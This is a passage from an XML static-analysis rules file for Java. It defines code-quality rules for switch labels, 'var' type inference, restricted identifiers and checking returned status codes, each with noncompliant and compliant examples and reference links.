            case &quot;a&quot; -&amp;gt; result = 1;
            default -&amp;gt; {
            doSomethingElse();
            result = 2;
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://openjdk.java.net/jeps/361&quot;&gt;JEP 361: Switch Expressions&lt;/a&gt;
            &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>java14</tag>
    </rule>

    <rule key='S6208' priority='INFO'>
        <configKey>S6208</configKey>
        <name>Comma-separated labels should be used in Switch with colon case</name>
        <description>
            &lt;p&gt;In Java 14 there is a new way to write cases in Switch Statement and Expression when the same
            action should be performed for different cases.
            Instead of declaring multiples branches with the same action, you can combine all of them in a single case
            group, separated with commas. It will
            result in a more concise code and improved readability.&lt;/p&gt;
            &lt;p&gt;This rule reports an issue when multiple cases in a Switch can be grouped into a single
            comma-separated case.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            // Switch Expression
            int i = switch (mode) {
            case &quot;a&quot;:
            case &quot;b&quot;:
            yield 1;
            default:
            yield 3;
            };

            // Switch Statement
            switch (mode) {
            case &quot;a&quot;:
            case &quot;b&quot;:
            doSomething();
            break;
            default:
            doSomethingElse();
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            // Switch Expression
            int i = switch (mode) {
            case &quot;a&quot;, &quot;b&quot;:
            yield 1;
            default:
            yield 3;
            };

            // Switch Statement
            switch (mode) {
            case &quot;a&quot;, &quot;b&quot;:
            doSomething();
            break;
            default:
            doSomethingElse();
            }

            // Or even better:
            switch (mode) {
            case &quot;a&quot;, &quot;b&quot; -&amp;gt; doSomething();
            default -&amp;gt; doSomethingElse();
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://openjdk.java.net/jeps/361&quot;&gt;JEP 361: Switch Expressions&lt;/a&gt;
            &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>java14</tag>
    </rule>

    <rule key='S6212' priority='INFO'>
        <configKey>S6212</configKey>
        <name>Local-Variable Type Inference should be used</name>
        <description>
            &lt;p&gt;In Java 10 &lt;a href=&quot;https://openjdk.java.net/jeps/286&quot;&gt;Local-Variable Type
            Inference&lt;/a&gt; was introduced. It allows you to omit the expected type of
            a variable by declaring it with the &lt;code&gt;var&lt;/code&gt; keyword. &lt;/p&gt;
            &lt;p&gt;While it is not always possible or cleaner to use this new way of declaring a variable, when the
            type on the left is the same as the one on the
            right in an assignment, using the &lt;code&gt;var&lt;/code&gt; will result in a more concise code.&lt;/p&gt;
            &lt;p&gt;This rule reports an issue when the expected type of the variable is the same as the returned type
            of assigned expression.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            MyClass myClass = new MyClass();
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            var myClass = new MyClass();
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://openjdk.java.net/jeps/286&quot;&gt;JEP 286: Local-Variable Type
            Inference&lt;/a&gt; &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>java10</tag>
    </rule>

    <rule key='S6213' priority='MAJOR'>
        <configKey>S6213</configKey>
        <name>Restricted Identifiers should not be used as Identifiers</name>
        <description>
            &lt;p&gt;Even if it is technically possible, &lt;a href=&quot;https://docs.oracle.com/javase/specs/jls/se16/html/jls-3.html#jls-3.8&quot;&gt;Restricted
            Identifiers&lt;/a&gt;
            should not be used as identifiers. This is only possible for compatibility reasons, using it in Java code is
            confusing and should be avoided.&lt;/p&gt;
            &lt;p&gt;Note that this applies to any version of Java, including the one where these identifiers are not
            yet restricted, to avoid future confusion.&lt;/p&gt;
            &lt;p&gt;This rule reports an issue when restricted identifiers:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; var &lt;/li&gt;
            &lt;li&gt; yield &lt;/li&gt;
            &lt;li&gt; record &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;are used as identifiers.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            var var = &quot;var&quot;; // Noncompliant: compiles but this code is confusing
            var = &quot;what is this?&quot;;

            int yield(int i) { // Noncompliant
            return switch (i) {
            case 1: yield(0); // This is a yield from switch expression, not a recursive call.
            default: yield(i-1);
            };
            }

            String record = &quot;record&quot;; // Noncompliant
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            var myVariable = &quot;var&quot;;

            int minusOne(int i) {
            return switch (i) {
            case 1: yield(0);
            default: yield(i-1);
            };
            }

            String myRecord = &quot;record&quot;;
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://docs.oracle.com/javase/specs/jls/se16/html/jls-3.html#jls-3.8&quot;&gt;JLS16,
            3.8: Identifiers&lt;/a&gt; &lt;/li&gt;
            &lt;/ul&gt;
        </description>
    </rule>

    <rule key='S899' priority='MINOR'>
        <configKey>S899</configKey>
        <name>Return values should not be ignored when they contain the operation status code</name>
        <description>
            &lt;p&gt;When the return value of a function call contain the operation status code, this value should be
            tested to make sure the operation completed
            successfully.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when the return values of the following are ignored:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;code&gt;java.io.File&lt;/code&gt; operations that return a status code (except &lt;code&gt;mkdirs&lt;/code&gt;)
            &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;Iterator.hasNext()&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;Enumeration.hasMoreElements()&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;Lock.tryLock()&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; non-void &lt;code&gt;Condition.await*&lt;/code&gt; methods &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;CountDownLatch.await(long, TimeUnit)&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;Semaphore.tryAcquire&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;BlockingQueue&lt;/code&gt;: &lt;code&gt;offer&lt;/code&gt;, &lt;code&gt;remove&lt;/code&gt;
            &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public void doSomething(File file, Lock lock) {
            file.delete(); // Noncompliant
            // ...
            lock.tryLock(); // Noncompliant
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public void doSomething(File file, Lock lock) {
            if (!lock.tryLock()) {
            // lock failed; take appropriate action
            }
            if (!file.delete()) {
            // file delete failed; take appropriate action
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/xzdGBQ&quot;&gt;CERT, EXP00-J.&lt;/a&gt; -
            Do not ignore values returned by methods &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/TTZGBQ&quot;&gt;CERT, FIO02-J.&lt;/a&gt; -
            Detect and handle file-related errors &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/754&quot;&gt;MITRE, CWE-754&lt;/a&gt; -
            Improper Check for Unusual Exceptional Conditions &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>cwe</tag>
        <tag>error-handling</tag>
    </rule>
</rules>